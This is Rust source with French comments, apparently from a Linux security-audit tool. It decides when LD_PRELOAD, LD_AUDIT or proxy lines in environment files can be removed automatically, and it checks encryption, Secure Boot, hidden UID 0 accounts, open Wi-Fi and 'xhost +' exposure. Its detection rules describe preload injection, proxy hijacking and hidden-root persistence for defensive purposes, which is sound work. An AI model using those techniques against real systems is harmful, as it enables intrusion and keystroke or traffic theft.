fn interprete_admis(contenu: &[u8]) -> bool {
    fn sans_blancs_au_bout(t: &[u8]) -> &[u8] {
        let debut = t.iter().position(|o| !blanc(*o)).unwrap_or(t.len());
        let fin = t
            .iter()
            .rposition(|o| !blanc(*o))
            .map_or(debut, |f| f.saturating_add(1));
        t.get(debut..fin.max(debut)).unwrap_or_default()
    }
    let premiere = contenu.split(|o| *o == b'\n').next().unwrap_or_default();
    let Some(reste) = premiere.strip_prefix(b"#!") else {
        return false;
    };
    let reste = sans_blancs_au_bout(reste);
    INTERPRETES_ADMIS.iter().any(|i| {
        reste.strip_prefix(*i).is_some_and(|option| {
            option.is_empty() || (option.first().is_some_and(|o| blanc(*o)) && sans_blancs_au_bout(option) == b"-e")
        })
    })
}

/// Un fichier lu une fois, pour juger le retrait de lignes seules (ronde 5 du lot 096, N1 : en temps linéaire). Au-delà
/// de `RETRAIT_LIGNES_MAX` lignes ou de `RETRAIT_OCTETS_MAX` octets, rien n'est lu et tout retrait est refusé.
///
/// Ronde 7 : Vanguard ne lit plus de shell. Quatre rondes de relecture ont trouvé des trous dans un lecteur de shell
/// (guillemets, substitutions, tableaux, heredocs, alias, variables lues par la suite) ; pour juger UNE ligne, il
/// fallait comprendre toutes les autres. La règle porte désormais sur le fichier entier (`simple`).
#[allow(clippy::struct_excessive_bools)] // des constats sur le fichier, chacun pour lui-même
pub(crate) struct AnalyseDeRetrait {
    /// Un fichier qu'un shell, pam_env ou systemd lit comme des variables (tout fichier sauf `lu_ligne_par_ligne`).
    shell: bool,
    /// Trop de lignes ou d'octets : rien n'est jugé.
    trop: bool,
    /// Pour chaque ligne (coupée au seul « \n ») : elle finit par « \ » (blancs, « \r » et saut de page de fin ôtés).
    barres: Vec<bool>,
    /// Pour chaque ligne : elle est de la forme `affectation_simple`.
    affectations: Vec<bool>,
    /// Le fichier est en UTF-8 et chacune de ses lignes est vide, un commentaire entier (`vide_ou_commentaire`) ou de
    /// la forme `affectation_simple`, chaque NOM une seule fois. Seul un tel fichier admet un retrait automatique
    /// quand un shell le lit : aucune de ses lignes ne peut ouvrir, lire, tester ni définir quoi que ce soit qu'une
    /// autre ligne verrait.
    simple: bool,
    /// Une ligne a plus de `LIGNE_OCTETS_MAX` octets (ronde 8 du lot 096, N8-1).
    longue: bool,
    /// Un fichier que le système lance lui-même dont la ligne « #! » n'est pas admise (`interprete_admis`, N8-3).
    interprete_refuse: bool,
    /// Le fichier jugé est /etc/ld.so.preload (sous la racine d'un essai aussi) : jamais une ligne de proxy.
    preload: bool,
    /// Le lecteur du fichier (N8-4, ronde 9).
    lecteur: LecteurDeLignes,
}

/// Au plus autant d'octets dans un fichier dont Vanguard juge le retrait d'une ligne seule ; au-delà, refus
/// (`Decoupe::Trop`). Le fils root n'en lit jamais tant (512 Kio) ; le bilan lit jusqu'à 32 Mio : la borne tient la
/// mémoire du jugement à quelques fois ce que dit la borne (ronde 6 du lot 096, R6-4).
pub(crate) const RETRAIT_OCTETS_MAX: usize = 4 * 1024 * 1024;

impl AnalyseDeRetrait {
    /// L'analyse de `fichier`, de contenu `contenu`.
    pub(crate) fn de(fichier: &str, contenu: &[u8]) -> Self {
        let lecteur = LecteurDeLignes::de(fichier);
        let shell = lecteur == LecteurDeLignes::Shell;
        let mut analyse = Self {
            shell,
            trop: true,
            barres: Vec::new(),
            affectations: Vec::new(),
            simple: false,
            longue: false,
            interprete_refuse: false,
            preload: fichier.ends_with("/etc/ld.so.preload"),
            lecteur,
        };
        if contenu.len() > RETRAIT_OCTETS_MAX || contenu.split(|o| *o == b'\n').nth(RETRAIT_LIGNES_MAX).is_some() {
            return analyse;
        }
        // fish ne lit pas « NOM=valeur » comme bash (une erreur pour lui) : un fichier .fish n'est jamais simple.
        let fish = fichier
            .rsplit_once('.')
            .is_some_and(|(_, ext)| ext.eq_ignore_ascii_case("fish"));
        let mut simple = shell && !fish && std::str::from_utf8(contenu).is_ok();
        let mut noms: std::collections::HashSet<&[u8]> = std::collections::HashSet::new();
        for ligne in contenu.split(|o| *o == b'\n') {
            pas_de_retrait();
            analyse.longue = analyse.longue || ligne.len() > LIGNE_OCTETS_MAX;
            analyse.barres.push(ligne.trim_ascii_end().ends_with(b"\\"));
            let nom = if shell { affectation_simple(ligne) } else { None };
            analyse.affectations.push(nom.is_some());
            if let Some(nom) = nom {
                // Un NOM posé deux fois : retirer l'une des lignes laisserait l'autre valeur, que la question ne
                // montre pas.
                simple = simple && noms.insert(nom);
            } else {
                simple = simple && vide_ou_commentaire(ligne);
            }
        }
        analyse.trop = false;
        analyse.simple = simple;
        analyse.interprete_refuse = shell && lance_par_le_systeme(fichier) && !interprete_admis(contenu);
        analyse
    }

    /// Pourquoi Vanguard ne retire pas lui-même la ligne `ligne`, écrite aux numéros `numeros` (`retrait_refuse`) ;
    /// `None` : il la retire. D'abord le fichier (`Decoupe::Format`, `Decoupe::Connexion`, `Decoupe::Trop`), puis la
    /// ligne (`ligne_offerte`), puis ce que son retrait ferait aux autres (`decoupe`).
    pub(crate) fn refus(&self, ligne: &[u8], numeros: &[usize]) -> Option<Decoupe> {
        self.refus_de(Retouche::Retirer, ligne, numeros)
    }

    /// Pourquoi Vanguard ne met pas lui-même en commentaire la ligne de proxy `ligne`, écrite aux numéros `numeros`
    /// (`proxy_refuse`) ; `None` : il la commente. Même règle que le retrait (ronde 10 du lot 096, N10-1) : une ligne
    /// mise en commentaire est une ligne retirée pour son lecteur.
    pub(crate) fn refus_de_proxy(&self, ligne: &[u8], numeros: &[usize]) -> Option<Decoupe> {
        self.refus_de(Retouche::CommenterProxy, ligne, numeros)
    }

    fn refus_de(&self, retouche: Retouche, ligne: &[u8], numeros: &[usize]) -> Option<Decoupe> {
        match self.lecteur {
            LecteurDeLignes::Format => return Some(Decoupe::Format),
            LecteurDeLignes::Connexion => return Some(Decoupe::Connexion),
            LecteurDeLignes::Shell => {}
        }
        if self.trop {
            return Some(Decoupe::Trop);
        }
        if !self.ligne_offerte(retouche, ligne) {
            return Some(Decoupe::Hors);
        }
        self.decoupe(numeros)
    }

    /// La ligne, dans un fichier lu par un shell, pam_env ou le générateur environment.d (les autres sont refusés
    /// avant), est-elle de celles que Vanguard retire ou commente lui-même (ronde 9 du lot 096, N9-3) ?
    /// - Pour un retrait : une affectation de LD_PRELOAD ou de LD_AUDIT qui précharge vraiment
    ///   (`definit_prechargement` : ni commentaire, ni « unset », ni valeur vide qui neutralise : N9-4).
    /// - Pour un commentaire de proxy (ronde 10, N10-1) : une ligne de proxy (`ligne_de_proxy`), hors de
    ///   /etc/ld.so.preload, que le chargeur lit autrement. Les noms en minuscules (« http_proxy ») ne sont pas des
    ///   affectations simples (`affectation_simple`) : refusés plus loin, à la main.
    ///
    /// Une ligne qui n'est pas une affectation simple est refusée plus loin (`Decoupe::Shell`) ; une affectation
    /// simple d'une autre variable (« FOO=LD_PRELOAD ») l'est ici. Une variable suspecte d'une autre sorte
    /// (PYTHONPATH, adresse de D-Bus) ou une commande reste à la main : le fils root ne saurait pas la juger comme le
    /// bilan (dossiers personnels, paquets), et n'admet que ce qu'il juge seul.
    fn ligne_offerte(&self, retouche: Retouche, ligne: &[u8]) -> bool {
        let Ok(texte) = std::str::from_utf8(ligne) else {
            return false;
        };
        if vide_ou_commentaire(ligne) {
            return false;
        }
        match retouche {
            Retouche::Retirer => {
                definit_prechargement(texte)
                    && affectation_simple(ligne).is_none_or(|nom| [&b"LD_PRELOAD"[..], b"LD_AUDIT"].contains(&nom))
            }
            Retouche::CommenterProxy => {
                !self.preload
                    && crate::machine::defense_eleve::ligne_de_proxy(ligne)
                    && affectation_simple(ligne).is_none_or(|nom| NOMS_DE_PROXY.contains(&nom))
            }
        }
    }

    /// Retirer les lignes `numeros` (depuis 0, coupées au seul « \n ») changerait-il le sens d'une AUTRE ligne ? Un
    /// numéro hors du fichier ne compte pas.
    /// - Pour tout fichier : l'une d'elles, ou celle d'avant, finit par « \ » (`Decoupe::Barre`). Le shell, systemd
    ///   et pam_env joignent une telle ligne à la suivante (systemd, même après un commentaire) : retirer
    ///   « export LD_PRELOAD=… \ » ferait lire la ligne d'après autrement (ronde 4 du lot 096, G34-1). Jugé même pour
    ///   les fichiers dont le lecteur ne joint rien (fichiers à clés) : un refus de trop laisse le geste à la main.
    /// - Pour un fichier lu par un shell (`Decoupe::Shell`) : le fichier n'est pas fait que de lignes vides, de
    ///   commentaires entiers et d'affectations de la forme la plus simple, chaque NOM une fois (`simple`), ou l'une
    ///   des lignes n'est pas une telle affectation. La question montre alors une ligne dont le retrait pourrait
    ///   changer des lignes non montrées : la correction reste à la main, avec la raison dite.
    /// - Trop de lignes ou d'octets : `Decoupe::Trop`, jamais un retrait admis sans jugement.
    fn decoupe(&self, numeros: &[usize]) -> Option<Decoupe> {
        match self.lecteur {
            LecteurDeLignes::Format => return Some(Decoupe::Format),
            LecteurDeLignes::Connexion => return Some(Decoupe::Connexion),
            LecteurDeLignes::Shell => {}
        }
        if self.trop {
            return Some(Decoupe::Trop);
        }
        if self.longue {
            return Some(Decoupe::Longue);
        }
        let barre = |n: usize| self.barres.get(n).copied().unwrap_or(false);
        if numeros.iter().any(|n| {
            pas_de_retrait();
            barre(*n) || n.checked_sub(1).is_some_and(barre)
        }) {
            return Some(Decoupe::Barre);
        }
        let hors_de_la_forme = || {
            !self.simple
                || numeros.iter().any(|n| {
                    pas_de_retrait();
                    self.affectations.get(*n).is_some_and(|a| !a)
                })
        };
        if self.shell {
            if self.interprete_refuse {
                return Some(Decoupe::Interprete);
            }
            return hors_de_la_forme().then_some(Decoupe::Shell);
        }
        Some(Decoupe::Connexion)
    }
}

/// `pacman -Qo` en anglais : « /usr/bin/su is owned by util-linux 2.42.4-1 », une ligne par fichier qui a un paquet.
fn proprietaires_pacman(sortie: &str) -> std::collections::HashMap<String, String> {
    sortie
        .lines()
        .filter_map(|l| {
            let (fichier, paquet) = l.rsplit_once(" is owned by ")?;
            Some((fichier.to_string(), paquet.split_whitespace().next()?.to_string()))
        })
        .collect()
}

/// Le paquet de chaque fichier trouvé dans une base ; `None` si elle ne se lit pas.
type Proprietaires = Option<HashMap<PathBuf, String>>;

/// Le paquet de chaque fichier d'après une lecture native (`lire`, un seul passage pour tous) ; `None` si la base
/// ne se lit pas. Le chemin d'avant la fusion de /usr est cherché aussi : dpkg garde souvent l'ancien
/// (/usr/bin/fusermount3 y est enregistré comme /bin/fusermount3, vu sur Mint 22).
fn proprietaires_selon(
    fichiers: &[PathBuf],
    lire: impl FnOnce(&[&Path]) -> Proprietaires,
) -> Option<Vec<Option<String>>> {
    let anciens: Vec<Option<PathBuf>> = fichiers.iter().map(|f| chemin_hors_usr(f)).collect();
    let cherches: Vec<&Path> = fichiers
        .iter()
        .map(PathBuf::as_path)
        .chain(anciens.iter().flatten().map(PathBuf::as_path))
        .collect();
    let trouves = lire(&cherches)?;
    Some(
        fichiers
            .iter()
            .zip(&anciens)
            .map(|(f, ancien)| {
                trouves
                    .get(f)
                    .or_else(|| ancien.as_ref().and_then(|a| trouves.get(a)))
                    .cloned()
            })
            .collect(),
    )
}

const DPKG_INFO: &str = "/var/lib/dpkg/info";

/// Le paquet de chaque fichier d'après les listes de dpkg (`dpkg -S`) ; `None` sans base dpkg lisible.
fn proprietaire_dpkg(fichiers: &[&Path]) -> Option<HashMap<PathBuf, String>> {
    proprietaire_dpkg_dans(Path::new(DPKG_INFO), fichiers)
}

/// Une liste « `<paquet>.list` » ou « `<paquet>:<architecture>.list` » par paquet, un chemin par ligne. Le nom est
/// gardé avec son architecture, comme dpkg -S l'écrit (« libc6:amd64 ») : quand libc6:i386 est là aussi (Steam
/// sur Ubuntu), « dpkg --verify libc6 » serait ambigu et la vérification du fichier perdue.
fn proprietaire_dpkg_dans(info: &Path, fichiers: &[&Path]) -> Option<HashMap<PathBuf, String>> {
    let cherches: std::collections::HashSet<&Path> = fichiers.iter().copied().collect();
    let mut listes: Vec<PathBuf> = std::fs::read_dir(info)
        .ok()?
        .flatten()
        .map(|e| e.path())
        .filter(|p| p.extension().is_some_and(|e| e == "list"))
        .collect();
    listes.sort();
    let mut trouves = HashMap::new();
    for l in listes {
        let Some(nom) = l.file_stem().map(|s| s.to_string_lossy().into_owned()) else {
            continue;
        };
        for ligne in std::fs::read_to_string(&l).unwrap_or_default().lines() {
            if let Some(&f) = cherches.get(Path::new(ligne)) {
                trouves.entry(f.to_path_buf()).or_insert_with(|| nom.clone());
            }
        }
    }
    Some(trouves)
}

const PACMAN_LOCAL: &str = "/var/lib/pacman/local";

/// Le mtree d'un paquet installé (ses empreintes SHA-256). Son dossier est « `<nom>-<version>` », la version lue
/// dans sa fiche ; pacman -Q seulement si la base ne se lit pas à l'endroit habituel (DBPath changé dans
/// pacman.conf), zcat seulement pour un fichier qui n'est pas du gzip.
fn mtree_pacman(paquet: &str) -> Option<String> {
    let dossier = match natif::desc_pacman(paquet) {
        Some(champs) => format!("{paquet}-{}", champs.get("VERSION")?.first()?),
        None if std::fs::read_dir(PACMAN_LOCAL).is_ok() => return None,
        None => sortie("pacman", &["-Q", paquet])?.trim().replace(' ', "-"),
    };
    let fichier = format!("{PACMAN_LOCAL}/{dossier}/mtree");
    let octets = std::fs::read(&fichier).ok()?;
    // Un mtree fait quelques centaines de ko ; au-delà de 256 Mo, ce n'en est pas un. Le repli sur zcat reste ici, propre
    // à Linux : le lecteur commun (`archives::gzip`) ne lance aucune commande.
    match crate::archives::gzip::degzip(&octets, 256 << 20) {
        Some(texte) => String::from_utf8(texte).ok(),
        None if octets.starts_with(&[0x1f, 0x8b]) => None,
        None => sortie("zcat", &[&fichier]),
    }
}

/// Le système de fichiers racine repose-t-il sur un volume chiffré (LUKS, éventuellement sous LVM) ?
/// `None` si on ne peut pas remonter la chaîne des périphériques.
fn racine_chiffree() -> Option<bool> {
    // Lu dans /proc/self/mountinfo puis sysfs ; findmnt et lsblk ne servent que si l'un des deux ne répond pas
    // (mountinfo illisible, périphérique inconnu de sysfs comme /dev/root).
    match natif::racine() {
        Some((source, _)) if !source.starts_with("/dev/") => return None,
        Some((source, _)) => {
            if let Some(chiffree) = natif::chiffre(&source) {
                return Some(chiffree);
            }
        }
        None => {}
    }
    // Par leur chemin du système et sans les variables du compte (relecture 0.94, F-2) : findmnt et lsblk lisent
    // LIBMOUNT_*, BLKID_* et LIBSMARTCOLS_*, qu'un programme du compte poserait pour leur faire dire « chiffré ».
    let source = sortie_propre("findmnt", &["-no", "SOURCE", "/"])?;
    // Btrfs affiche le sous-volume : « /dev/mapper/root[/@] ».
    let peripherique = source.trim().split('[').next()?.to_string();
    if !peripherique.starts_with("/dev/") {
        return None;
    }
    // -s : la chaîne inverse, du volume monté jusqu'au disque (lvm → crypt → part → disk).
    let chaine = sortie_propre("lsblk", &["-nso", "TYPE", &peripherique])?;
    Some(chaine.lines().any(|l| l.trim() == "crypt"))
}

/// Sortie standard d'un outil du système lancé par `commande::outil_propre` (son chemin du système, un environnement
/// vidé des variables du compte), ou `None` s'il n'y est pas ou échoue : jamais pris dans le PATH du compte.
fn sortie_propre(nom: &str, args: &[&str]) -> Option<String> {
    let r = crate::commande::lancer(crate::commande::outil_propre(nom)?.args(args), 30)?;
    (r.code == Some(0)).then_some(r.sortie)
}

fn chiffrement_disque() -> Constat {
    // On vérifie le volume du système lui-même : un swap chiffré seul ne protège pas les données.
    match racine_chiffree() {
        Some(true) => ok("Chiffrement", tr!("Système chiffré (LUKS).", "System encrypted (LUKS).")),
        None => impossible("Chiffrement", tr!("volume racine introuvable, conteneur ?", "root volume not found, container?")),
        Some(false) => alerte(
            "Chiffrement",
            Niveau::Moyen,
            tr!("Le système n'est pas chiffré : en cas de vol, les données sont lisibles.", "The system is not encrypted: if stolen, the data can be read."),
        )
        .manuel(
            tr!("Le chiffrement complet se choisit à l'installation (Omarchy le propose) : à prévoir à la prochaine réinstallation", "Full encryption is chosen at install time (Omarchy offers it): plan it for the next reinstall"),
            &[],
        ),
    }
}

fn demarrage_securise() -> Constat {
    let actif = std::fs::read_dir("/sys/firmware/efi/efivars")
        .ok()
        .and_then(|d| {
            d.flatten()
                .find(|f| f.file_name().to_string_lossy().starts_with("SecureBoot-"))
        })
        .and_then(|f| std::fs::read(f.path()).ok())
        .is_some_and(|o| o.last() == Some(&1));
    if actif {
        ok("Secure Boot", tr!("Démarrage sécurisé actif.", "Secure Boot on."))
    } else {
        alerte("Secure Boot", Niveau::Info, tr!("Secure Boot désactivé (protège contre les bootkits).", "Secure Boot off (it protects against bootkits)."))
            .manuel(tr!("Se configure avec sbctl puis dans le BIOS ; voir le wiki Arch « Unified Extensible Firmware Interface/Secure Boot »", "Set up with sbctl, then in the BIOS; see the Arch wiki “Unified Extensible Firmware Interface/Secure Boot”"), &[])
    }
}

fn comptes() -> Constat {
    let Ok(passwd) = crate::socle::lire_texte("/etc/passwd") else {
        return impossible("Comptes", tr!("/etc/passwd illisible", "/etc/passwd unreadable"));
    };
    juger_comptes(&passwd)
}

/// Le jugement de /etc/passwd : un compte autre que root à l'UID 0.
pub(super) fn juger_comptes(passwd: &str) -> Constat {
    let uid0: Vec<&str> = passwd
        .lines()
        .filter_map(|l| {
            let c: Vec<&str> = l.split(':').collect();
            match c.as_slice() {
                [nom, _, "0", ..] if *nom != "root" => Some(*nom),
                _ => None,
            }
        })
        .collect();
    if uid0.is_empty() {
        ok("Comptes", tr!("Seul root a l'UID 0.", "Only root has UID 0."))
    } else {
        let constat = alerte(
            "Comptes",
            Niveau::Critique,
            trf!(
                "Comptes avec droits root cachés (UID 0) : {}",
                "Hidden accounts with root rights (UID 0): {}",
                uid0.join(", ")
            ),
        )
        .manuel(
            tr!(
                "Signe possible d'intrusion : ne pas supprimer à l'aveugle, vérifier d'abord leur origine",
                "Possible sign of intrusion: do not delete blindly, check where they come from first"
            ),
            &["grep ':0:' /etc/passwd"],
        );
        // Verrouillés, jamais supprimés : le compte et ses fichiers restent pour comprendre d'où il vient.
        super::defense::corriger(
            constat,
            tr!(
                "Verrouiller ces comptes (ils ne s'ouvrent plus ; rien n'est supprimé), puis chercher leur origine : signe possible d'intrusion",
                "Lock these accounts (they no longer open; nothing is deleted), then look for where they come from: possible sign of intrusion"
            ),
            &super::defense::verrouiller(uid0.iter().copied()),
        )
    }
}

/// Wi-Fi : protection du réseau connecté, et un éventuel jumeau maléfique parmi les réseaux visibles. Lus par
/// NetworkManager sur le bus (la liste qu'il tient à jour, sans balayer), sinon par le noyau (nl80211, sous iwd ou
/// systemd-networkd). Jamais muet : sans lecture, `wifi_sans_lecture` dit « sans objet » (pas de carte) ou « non
/// vérifié » ; lu mais sans réseau connecté, « sans objet ».
fn wifi(passerelle: Option<String>) -> Vec<Constat> {
    let l = match super::wifi::lecture_linux() {
        Ok(l) => l,
        Err(pourquoi) => return vec![wifi_sans_lecture(cartes_wifi(Path::new("/sys/class/net")), pourquoi)],
    };
    if l.connexion.is_none() {
        return vec![super::sans_objet(
            "Wi-Fi",
            crate::modele::Absence::Inactif,
            tr!(
                "Aucun réseau Wi-Fi connecté : rien à juger.",
                "No Wi-Fi network connected: nothing to judge."
            ),
        )];
    }
    let admin = format!(
        "xdg-open https://{}",
        passerelle.unwrap_or_else(|| "192.168.1.1".into())
    );
    let mut constats = super::wifi::bilan(&l, &[&admin]);
    constats.extend(wifi_ouverts_automatiques());
    constats
}

/// Combien de cartes Wi-Fi le noyau connaît : une interface réseau qui a un dossier « wireless » ou « phy80211 »
/// dans sysfs. Lu sans aucun outil, pour savoir si un bilan sans nmcli n'a rien à juger ou ne voit pas. `Err` (le
/// pourquoi du système) : sysfs ne se lit pas (conteneur, droits), et l'absence de carte n'est alors pas prouvée.
fn cartes_wifi(sys_net: &Path) -> std::io::Result<usize> {
    std::fs::read_dir(sys_net).map(|d| {
        d.flatten()
            .filter(|e| e.path().join("wireless").exists() || e.path().join("phy80211").exists())
            .count()
    })
}

/// Ni NetworkManager ni le noyau ne disent le Wi-Fi : sans carte Wi-Fi, rien à juger ; avec, le bilan ne voit pas
/// le réseau, et le dit. Les cartes pas comptées (sysfs illisible) : non vérifié aussi, jamais « pas de carte ».
/// `pourquoi` : la raison du noyau.
fn wifi_sans_lecture(cartes: std::io::Result<usize>, pourquoi: &str) -> Constat {
    let cartes = match cartes {
        Ok(n) => n,
        Err(e) => {
            return super::impossible_par(
                "Wi-Fi",
                crate::modele::Raison::Illisible(e.to_string()),
                trf!(
                    "Impossible de vérifier le Wi-Fi : ni NetworkManager ni le noyau ne le disent ({pourquoi}), et la liste des cartes réseau (/sys/class/net) ne se lit pas.",
                    "Could not check Wi-Fi: neither NetworkManager nor the kernel tells it ({pourquoi}), and the network card list (/sys/class/net) cannot be read."
                ),
            );
        }
    };
    if cartes == 0 {
        return super::sans_objet(
            "Wi-Fi",
            crate::modele::Absence::Materiel,
            tr!(
                "Pas de carte Wi-Fi sur cet ordinateur.",
                "No Wi-Fi card on this computer."
            ),
        );
    }
    super::impossible_par(
        "Wi-Fi",
        crate::modele::Raison::Illisible(pourquoi.to_string()),
        trf!(
            "Impossible de vérifier le Wi-Fi : ni NetworkManager ni le noyau (nl80211) ne le disent ({pourquoi}). L'audit du réseau le lit aussi par le noyau.",
            "Could not check Wi-Fi: neither NetworkManager nor the kernel (nl80211) tells it ({pourquoi}). The network audit reads it from the kernel too."
        ),
    )
}

/// Connexions Wi-Fi de NetworkManager qui se reconnectent toutes seules : (UUID, nom). Le nom vient en dernier, sans
/// échappement : un « : » dans le nom reste intact. Un UUID qui n'a pas sa forme est écarté (il entre dans une
/// commande).
fn connexions_wifi_auto(sortie: &str) -> Vec<(String, String)> {
    sortie
        .lines()
        .filter_map(|l| {
            let mut champs = l.splitn(4, ':');
            let (uuid, genre, auto, nom) = (champs.next()?, champs.next()?, champs.next()?, champs.next()?);
            let uuid_valide = uuid.len() == 36 && uuid.chars().all(|c| c.is_ascii_hexdigit() || c == '-');
            (uuid_valide && genre == "802-11-wireless" && auto == "yes").then(|| (uuid.to_string(), nom.to_string()))
        })
        .collect()
}

/// Une connexion Wi-Fi ouverte, d'après `nmcli -t connection show` : sans gestion de clé (section absente, ou
/// valeur vide). « none » est du WEP, « owe » du Wi-Fi ouvert chiffré : pas ouverts.
fn wifi_ouvert(details: &str) -> bool {
    details
        .lines()
        .find_map(|l| l.strip_prefix("802-11-wireless-security.key-mgmt:"))
        .is_none_or(|v| v.trim().is_empty() || v.trim() == "--")
}

/// Réseaux ouverts enregistrés (sans gestion de clé) qui se reconnectent seuls : les profils lus nativement, comme
/// l'audit du réseau (NetworkManager et iwd, en administrateur) ; sinon NetworkManager par D-Bus ; sinon nmcli, 40
/// connexions regardées au plus. Au-delà des bornes : non vérifié (`trop_de_profils`).
fn wifi_ouverts_automatiques() -> Option<Constat> {
    if let Ok(profils) = super::wifi::profils::lire_linux() {
        return super::wifi::ouverts_des_profils(&profils);
    }
    // Sans droits : NetworkManager par D-Bus (GetSettings, sans les secrets), nmcli en secours.
    match networkmanager::profils() {
        Ok(networkmanager::Releve::Trop(n)) => return Some(trop_de_profils(n)),
        Ok(networkmanager::Releve::Profils(profils)) => return ouverts_par_dbus(&profils),
        Err(_) => {}
    }
    let liste = crate::commande::lancer_en_anglais(
        crate::commande::par_le_systeme("nmcli").args([
            "-t",
            "-e",
            "no",
            "-f",
            "UUID,TYPE,AUTOCONNECT,NAME",
            "connection",
            "show",
        ]),
        15,
    )
    .filter(|r| r.code == Some(0))?;
    let (mut noms, mut commandes) = (Vec::new(), Vec::new());
    let connexions = connexions_wifi_auto(&liste.sortie);
    // nmcli est lancé une fois par connexion : au-delà de 40, pas de liste partielle jugée complète.
    if connexions.len() > NMCLI_MAX {
        return Some(trop_de_profils(connexions.len()));
    }
    for (uuid, nom) in connexions {
        // Toute la connexion (les secrets restent cachés sans --show-secrets) : un réseau ouvert n'a pas de section
        // de sécurité, et demander un de ses champs pourrait faire répondre nmcli par une erreur.
        let ouvert = crate::commande::lancer_en_anglais(
            crate::commande::par_le_systeme("nmcli").args(["-t", "connection", "show", &uuid]),
            10,
        )
        .is_some_and(|r| r.code == Some(0) && wifi_ouvert(&r.sortie));
        if ouvert {
            commandes.push(format!("nmcli connection modify {uuid} connection.autoconnect no"));
            noms.push(nom);
        }
    }
    super::wifi::ouverts_automatiques(&noms, &commandes)
}

/// Les connexions Wi-Fi regardées une à une par nmcli, au plus.
const NMCLI_MAX: usize = 40;

/// Les réseaux ouverts en reconnexion automatique, d'après les profils lus par D-Bus.
fn ouverts_par_dbus(profils: &[networkmanager::Profil]) -> Option<Constat> {
    let (mut noms, mut commandes) = (Vec::new(), Vec::new());
    for p in profils {
        let Some(uuid) = p
            .uuid()
            .filter(|u| u.len() == 36 && u.chars().all(|c| c.is_ascii_hexdigit() || c == '-'))
        else {
            continue;
        };
        if p.genre() == "802-11-wireless" && p.automatique() && p.ouvert() {
            commandes.push(format!("nmcli connection modify {uuid} connection.autoconnect no"));
            noms.push(p.nom().to_string());
        }
    }
    super::wifi::ouverts_automatiques(&noms, &commandes)
}

/// Trop de profils enregistrés pour les lire tous : non vérifié, dit, jamais « aucun réseau ouvert ».
fn trop_de_profils(n: usize) -> Constat {
    crate::machine::impossible(
        "Wi-Fi",
        &trf!(
            "réseaux enregistrés : {n} profils, trop pour les lire tous ; un réseau ouvert en reconnexion automatique pourrait s'y cacher",
            "saved networks: {n} profiles, too many to read them all; an open network that reconnects automatically could hide among them"
        ),
    )
}

/// Contrôle d'accès de l'affichage X11 (`xhost`) : coupé (« xhost + »), n'importe quel programme, même d'un autre
/// ordinateur, peut ouvrir des fenêtres, lire le clavier et copier l'écran. Sans X11 ni xhost, rien à dire.
fn acces_x11() -> Option<Constat> {
    std::env::var_os("DISPLAY")?;
    juger_xhost(&sortie("xhost", &[])?)
}

/// La sortie de `xhost` : la première ligne dit si le contrôle est actif, les suivantes qui est permis. Les comptes
/// locaux (« SI:localuser: ») sont normaux ; une adresse ou un nom d'ordinateur ne l'est pas.
fn juger_xhost(sortie: &str) -> Option<Constat> {
    let mut lignes = sortie.lines();
    if lignes.next()?.contains("access control disabled") {
        return Some(
            alerte(
                "Affichage X11",
                Niveau::Eleve,
                tr!(
                    "L'affichage accepte tout le monde (« xhost + ») : n'importe quel programme, même d'un autre ordinateur, peut lire votre clavier et copier votre écran.",
                    "The display accepts everyone (“xhost +”): any program, even from another computer, can read your keyboard and copy your screen."
                ),
            )
            .corriger(
                tr!(
                    "Remettre le contrôle d'accès (puis retirer « xhost + » de ~/.xprofile ou ~/.xinitrc, sinon il revient à la prochaine session)",
                    "Turn access control back on (then remove “xhost +” from ~/.xprofile or ~/.xinitrc, or it comes back next session)"
                ),
                &["xhost -"],
            ),
        );
    }
    let permis: Vec<&str> = lignes
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with("SI:") && !l.starts_with("LOCAL:"))
        .collect();
    if permis.is_empty() {
        return None;
    }
    let montres: Vec<String> = permis.iter().map(|p| crate::ui::affichable(p)).collect();
    // Une entrée n'entre dans une commande que si elle n'a que des caractères d'adresse ou de nom d'ordinateur.
    let commandes: Vec<String> = permis
        .iter()
        .filter(|p| p.chars().all(|c| c.is_ascii_alphanumeric() || ".:-_[]".contains(c)))
        .map(|p| format!("xhost -{p}"))
        .collect();
    let commandes: Vec<&str> = commandes.iter().map(String::as_str).collect();
    Some(
        alerte(
            "Affichage X11",
            Niveau::Moyen,
            trf!(
                "D'autres ordinateurs peuvent se servir de votre affichage (lire le clavier, copier l'écran) : {}.",
                "Other computers can use your display (read the keyboard, copy the screen): {}.",
                crate::ui::resume(&montres, 4, ", ")
            ),
        )
        .manuel(
            tr!(
                "Les retirer si vous ne les reconnaissez pas (et de ~/.xprofile ou ~/.xinitrc s'ils y sont ajoutés)",
                "Remove them if you do not recognize them (and from ~/.xprofile or ~/.xinitrc if they are added there)"
            ),
            &commandes,
        ),
    )
}

/// Verrouillage automatique de l'écran après inactivité, selon l'environnement de bureau.
fn verrouillage_ecran() -> Option<Constat> {
    // Pas de session graphique (serveur) : rien à verrouiller.
    if std::env::var_os("WAYLAND_DISPLAY").is_none() && std::env::var_os("DISPLAY").is_none() {
        return None;
    }
    let bureau = std::env::var("XDG_CURRENT_DESKTOP")
        .unwrap_or_default()
        .to_ascii_lowercase();
    let maison = Path::new(&home()).to_path_buf();
    // Délai de verrouillage en secondes : Some(0) = jamais, None = inconnu.
    let delai: Option<u64> = if Path::new("/usr/share/omarchy").exists() {
        // Omarchy : idle.lock dans shell.json (celui de l'utilisateur, sinon la valeur par défaut).
        [
            maison.join(".config/omarchy/shell.json"),
            "/usr/share/omarchy/config/omarchy/shell.json".into(),
        ]
        .iter()
        .filter_map(|p| std::fs::read_to_string(p).ok())
        .filter_map(|t| serde_json::from_str::<serde_json::Value>(&t).ok())
        .find_map(|v| v.pointer("/idle/lock").and_then(serde_json::Value::as_u64))
    } else if bureau.contains("gnome") || bureau.contains("cinnamon") {
        let racine = if bureau.contains("cinnamon") {
            "org.cinnamon.desktop"
        } else {
            "org.gnome.desktop"
        };
        // Lus dans dconf et les schémas compilés ; gsettings en secours.
        let lire = |schema: String, cle: &str| {
            dconf::gsettings_get(&schema, cle).or_else(|| sortie("gsettings", &["get", &schema, cle]))
        };
        let actif = lire(format!("{racine}.screensaver"), "lock-enabled").map(|v| v.trim() == "true");
        let inactivite = lire(format!("{racine}.session"), "idle-delay")
            .and_then(|v| v.split_whitespace().last()?.parse::<u64>().ok());
        match (actif, inactivite) {
            (Some(false), _) => Some(0),
            (Some(true), Some(i)) => Some(i),
            _ => None,
        }
    } else if bureau.contains("kde") {
        // KDE : verrouillage actif par défaut après 5 minutes.
        let lire = |cle: &str| {
